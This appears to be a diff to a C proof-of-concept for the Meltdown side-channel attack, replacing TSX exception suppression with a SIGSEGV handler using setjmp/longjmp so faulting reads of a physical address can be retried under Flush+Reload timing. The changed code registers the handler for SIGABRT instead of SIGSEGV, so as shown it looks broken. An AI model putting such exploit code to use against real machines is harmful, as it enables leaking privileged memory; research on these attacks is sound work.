@@ -3,12 +3,14 @@
 #include <fcntl.h>
 #include <memory.h>
 #include <setjmp.h>
-#include <signal.h>
+#include <stddef.h>
 #include <stdarg.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <immintrin.h>
+#include <sys/types.h>
+#include <signal.h>
 
 size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
 int measurements = 10; /**< Number of measurements to perform for one address */
@@ -17,6 +19,15 @@ int retries = 10000; /**< Number of Meltdown retries for an address */
 char *mem = NULL;
 size_t phys_addr = 0x80000000;
 static jmp_buf buf;
+
+
+
+static void segfault_handler(int signum) {
+  if (signum == SIGSEGV){
+  signal(SIGSEGV, segfault_handler);
+  longjmp(buf, 1);
+}
+}
 
 
 static inline size_t rdtsc();
@@ -120,8 +131,13 @@ for(int i = 0 ; i < 256 ; i++)
 for (int i = 0 ; i < measurements ; i++){
 /* Reading from memory using tsx as a exception suppression machenasim */
   while (retries--) {
-    if(!setjmp(buf)){
+    if(setjmp(buf) == 0){
     //if (_xbegin() == _XBEGIN_STARTED){
+    typedef void (*SignalHandlerPointer)(int);
+
+    SignalHandlerPointer previousHandler;
+    previousHandler = signal(SIGABRT, segfault_handler);
+
       Meltdown(phys_addr, mem);
       //_xend();
     //}else{
